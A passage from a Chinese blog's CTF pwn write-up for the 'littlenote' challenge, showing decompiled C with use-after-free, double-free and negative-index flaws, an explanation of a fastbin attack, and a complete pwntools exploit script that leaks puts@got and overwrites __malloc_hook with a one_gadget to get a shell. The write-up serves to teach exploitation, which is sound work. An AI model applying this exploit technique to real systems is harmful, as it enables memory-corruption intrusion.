+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">shownote</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Which note do you want to show?"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%u"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; (<span class="keyword">unsigned</span> __int64)notenum )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( note[v1] )</span><br><span class="line">      <span class="built_in">puts</span>(note[v1]); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>freenote释放note[idx]对应的内存，但没有置零，UAF和double free</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">freenote</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Which note do you want to delete?"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%u"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; (<span class="keyword">unsigned</span> __int64)notenum )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( note[v1] )</span><br><span class="line">      <span class="built_in">free</span>(note[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>hacksys先输入name，然后调用hacker函数十次输入age，但这里的idx和age都由用户控制，如果idx为负数就会躲过检查，在栈上数组之前的位置随意写。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">hacksys</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter administrator's name:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%9s"</span>, &amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\n--------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome:"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\n"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\n--------------------"</span>);</span><br><span class="line">  hacker();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">hacker</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">  __int64 s[<span class="number">11</span>]; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to hacker's system\n"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Now you can set hackers' age\n"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Enter hacker index:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%lld"</span>, &amp;v3);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Enter hacker age:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%lld"</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">9</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    s[v3] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Now let's see your creation:'"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; ++j )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%lld "</span>, s[j]);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞及利用-2"><a href="#漏洞及利用-2" class="headerlink" title="漏洞及利用"></a>漏洞及利用</h2><p>主要利用fastbin attack，修改fastbin中某一块内存的FD指针，使之指向stderr-0x3，这个位置开始的块，size字段能够对应到0x7f。通过将stderr-0x3分配出去后，修改note[0]，使之指向puts@got，再利用show泄露puts的地址。</p>
+<p>同样的方式修改FD指向malloc_hook-0x23，修改malloc_hook为one_gadget。</p>
+<p>栈中修改内存的方式暂时没有想出来如何利用QWQ</p>
+<h2 id="利用脚本-2"><a href="#利用脚本-2" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./littlenote'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">sys_plt =  <span class="number">0x400760</span></span><br><span class="line">stderr = <span class="number">0x6020c0</span></span><br><span class="line">puts_got = <span class="number">0x602020</span></span><br><span class="line">gadget=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(note,keep=<span class="string">'y'</span>)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice:\n"</span>,<span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter your note\n"</span>,note) <span class="comment">#read</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Want to keep your note?\n"</span>,keep)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice:\n"</span>,<span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Which note do you want to show?\n"</span>,str(idx)) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice:\n"</span>,<span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Which note do you want to delete?\n"</span>,str(idx))	</span><br><span class="line"></span><br><span class="line">add(<span class="string">"0gur1"</span>)</span><br><span class="line">add(<span class="string">"1gur1"</span>)</span><br><span class="line">free(<span class="number">0</span>)		<span class="comment">#fastbin-&gt;0</span></span><br><span class="line">free(<span class="number">1</span>)		<span class="comment">#fastbin-&gt;1-&gt;0</span></span><br><span class="line">free(<span class="number">0</span>)		<span class="comment">#fastbin-&gt;0-&gt;1-&gt;0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(p64(stderr<span class="number">-0x3</span>))<span class="comment">#fastbin-&gt;1-&gt;0-&gt;stderr-0x3</span></span><br><span class="line">add(<span class="string">"3gur1"</span>)<span class="comment">#fastbin-&gt;0-&gt;stderr-0x3</span></span><br><span class="line">add(<span class="string">"4gur1"</span>)<span class="comment">#fastbin-&gt;stderr-0x3</span></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0x13</span>+p64(puts_got))<span class="comment">#note[0]=puts_got</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">"puts_addr:%#x"</span>,puts_addr)</span><br><span class="line">malloc_hook = puts_addr-(libc.symbols[<span class="string">'puts'</span>]-libc.symbols[<span class="string">'__malloc_hook'</span>])</span><br><span class="line">log.info(<span class="string">"malloc_hook:%#x"</span>,malloc_hook)</span><br><span class="line">one_gadget = puts_addr - libc.symbols[<span class="string">'puts'</span>]+gadget[<span class="number">1</span>]</span><br><span class="line">add(<span class="string">"6gur1"</span>)</span><br><span class="line">add(<span class="string">"7gur1"</span>)</span><br><span class="line">free(<span class="number">6</span>)		<span class="comment">#fastbin-&gt;6</span></span><br><span class="line">free(<span class="number">7</span>)		<span class="comment">#fastbin-&gt;7-&gt;6</span></span><br><span class="line">free(<span class="number">6</span>)		<span class="comment">#fastbin-&gt;6-&gt;7-&gt;6	</span></span><br><span class="line"></span><br><span class="line">add(p64(malloc_hook<span class="number">-0x23</span>))<span class="comment">#fastbin-&gt;7-&gt;6-&gt;malloc_hook-0x23</span></span><br><span class="line">add(<span class="string">"9gur1"</span>)<span class="comment">#fastbin-&gt;6-&gt;malloc_hook-0x23</span></span><br><span class="line">add(<span class="string">"agur1"</span>)<span class="comment">#fastbin-&gt;malloc_hook-0x23</span></span><br><span class="line">add(<span class="number">0x13</span>*<span class="string">'a'</span>+p64(one_gadget))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice:\n"</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/18/2018-x-nuca-pwn/" rel="next" title="2018 x-nuca pwn">
+                <i class="fa fa-chevron-left"></i> 2018 x-nuca pwn
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/avatar.jpg"
+                alt="0gur1" />
+            
+              <p class="site-author-name" itemprop="name">0gur1</p>
+              <p class="site-description motion-element" itemprop="description">Stay hungry.Stay foolish.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#shotshot"><span class="nav-number">1.</span> <span class="nav-text">shotshot</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本逻辑"><span class="nav-number">1.1.</span> <span class="nav-text">基本逻辑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞及利用"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞及利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用脚本"><span class="nav-number">1.3.</span> <span class="nav-text">利用脚本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hero"><span class="nav-number">2.</span> <span class="nav-text">hero</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本逻辑-1"><span class="nav-number">2.1.</span> <span class="nav-text">基本逻辑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞及利用-1"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞及利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用脚本-1"><span class="nav-number">2.3.</span> <span class="nav-text">利用脚本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#littlenote"><span class="nav-number">3.</span> <span class="nav-text">littlenote</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本逻辑-2"><span class="nav-number">3.1.</span> <span class="nav-text">基本逻辑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞及利用-2"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞及利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用脚本-2"><span class="nav-number">3.3.</span> <span class="nav-text">利用脚本</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">0gur1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客量:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("KvkboNezCqOpWaIBvOMgJE3K-gzGzoHsz", "slQuYxW7tjbda9dyxmi3dY4o");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
